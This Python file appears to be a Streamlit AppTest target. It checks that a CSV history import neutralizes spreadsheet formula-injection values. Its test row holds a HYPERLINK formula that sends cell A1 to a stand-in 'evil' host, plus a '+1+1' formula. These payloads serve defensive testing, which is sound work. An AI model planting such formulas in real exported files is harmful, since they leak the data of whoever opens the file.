"""AppTest target: imports a CSV containing formula-injection payloads
through the real import_history_csv() and prints back exactly what got
stored, so the test can assert it was neutralized."""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))

import pandas as pd
import streamlit as st

from modules.history import get_history_df, import_history_csv

df = pd.DataFrame([{
    "Timestamp": "2026-01-01",
    "Query": '=HYPERLINK("http://evil/?"&A1)',
    "Top Material": "+1+1",
    "Confidence": "90%",
    "Est. Cost": "100",
    "Volume": 5.0,
    "Units": "Metric",
    "# Results": 1,
}])
import_history_csv(df, mode="append")
row = get_history_df().iloc[0]
# Report unambiguous booleans rather than repr() text - repr() wraps a
# string containing a double-quote in single quotes, which previously
# made a naive quote-matching assertion in the test report a false
# failure even though the sanitization had worked correctly.
st.write(f"query_sanitized: {row['query'].startswith(chr(39) + '=')}")
st.write(f"material_sanitized: {row['top_material'].startswith(chr(39) + '+')}")
st.write("query_value: " + row["query"])
st.write("material_value: " + row["top_material"])
